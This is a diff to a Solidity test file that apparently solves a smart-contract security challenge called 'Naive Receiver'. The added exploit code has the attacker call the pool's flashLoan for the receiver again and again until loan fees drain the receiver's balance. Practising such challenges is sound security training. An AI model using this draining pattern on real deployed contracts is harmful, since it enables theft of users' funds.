@@ -54,6 +54,11 @@ contract NaiveReceiverTest is BaseTest {
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
+        vm.startPrank(attacker);
+        while (address(receiver).balance > 0) {
+            pool.flashLoan(address(receiver), 0);
+        }
+        vm.stopPrank();
     }
 
     function success() internal override {
